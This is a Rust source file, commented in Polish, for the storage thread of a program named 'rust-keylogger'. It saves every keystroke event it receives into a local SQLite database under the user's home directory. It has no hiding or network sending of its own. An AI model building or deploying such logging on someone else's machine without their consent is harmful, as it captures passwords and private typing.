use std::env;
use std::sync::mpsc::Receiver;
use std::thread;
use std::time::UNIX_EPOCH;
use std::path::PathBuf;
use rusqlite::{params, Connection};

use crate::events::KeyEvent;

pub fn start_db_thread(rx: Receiver<KeyEvent>) {
    thread::spawn(move || {
        // Oblicz domyślną ścieżkę do bazy (np. ~/.local/share/rust-keylogger/keylog.db)
        let db_path = env::var("KEYLOGGER_DB_PATH").unwrap_or_else(|_| {
            let home_dir = env::var("HOME").unwrap_or_else(|_| ".".to_string());
            let path = PathBuf::from(home_dir)
                .join(".local")
                .join("share")
                .join("rust-keylogger");
            
            // Upewnij się, że katalog istnieje
            if let Err(e) = std::fs::create_dir_all(&path) {
                eprintln!("Błąd podczas tworzenia katalogu na bazę {}: {}", path.display(), e);
            }
            
            path.join("keylog.db").to_string_lossy().into_owned()
        });

        println!("Baza SQLite: {}", db_path);

        // Otwórz / utwórz bazę danych
        let conn = match Connection::open(&db_path) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("Nie udało się połączyć z bazą danych: {}", e);
                return;
            }
        };

        // Ustaw tryb WAL (Write-Ahead Logging), aby móc swobodnie odczytywać bazę, 
        // kiedy program działa w tle bez błędu "database is locked".
        let _ = conn.pragma_update(None, "journal_mode", "WAL");
        let _ = conn.pragma_update(None, "synchronous", "NORMAL");

        // Zainicjuj tabelę jeśli nie istnieje
        if let Err(e) = conn.execute(
            "CREATE TABLE IF NOT EXISTS keystrokes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp INTEGER NOT NULL,
                event_type TEXT NOT NULL,
                key_name TEXT NOT NULL,
                keycode INTEGER NOT NULL
            )",
            [],
        ) {
            eprintln!("Nie udało się utworzyć tabeli keystrokes: {}", e);
            return;
        }

        // Pętla odczytująca wiadomości w tle
        for event in rx {
            let ts = match event.timestamp.duration_since(UNIX_EPOCH) {
                Ok(n) => n.as_millis() as i64,
                Err(_) => 0,
            };

            if let Err(e) = conn.execute(
                "INSERT INTO keystrokes (timestamp, event_type, key_name, keycode) VALUES (?1, ?2, ?3, ?4)",
                params![ts, event.event_type, event.key_name, event.keycode],
            ) {
                eprintln!("Błąd wstawiania do bazy danych: {}", e);
            }
        }
    });
}
